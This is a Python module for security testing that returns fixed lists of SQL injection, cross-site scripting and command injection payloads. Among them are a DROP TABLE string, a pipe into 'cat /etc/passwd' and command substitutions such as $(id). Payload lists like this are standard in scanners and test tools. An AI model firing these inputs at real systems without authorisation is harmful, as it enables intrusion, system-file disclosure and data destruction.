"""Payload Generator untuk testing"""

import logging
from typing import List, Dict

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Generate payloads untuk security testing"""

    def __init__(self):
        """Initialize payload generator"""
        self.payloads = {
            "sql_injection": self._generate_sql_payloads(),
            "xss": self._generate_xss_payloads(),
            "command_injection": self._generate_command_payloads(),
        }
        logger.info("PayloadGenerator initialized")

    def get_payloads(self, injection_type: str) -> List[str]:
        """Get payloads untuk injection type tertentu"""
        return self.payloads.get(injection_type, [])

    @staticmethod
    def _generate_sql_payloads() -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users; --",
        ]

    @staticmethod
    def _generate_xss_payloads() -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ]

    @staticmethod
    def _generate_command_payloads() -> List[str]:
        """Generate command injection payloads"""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "` whoami`",
            "$(id)",
        ]
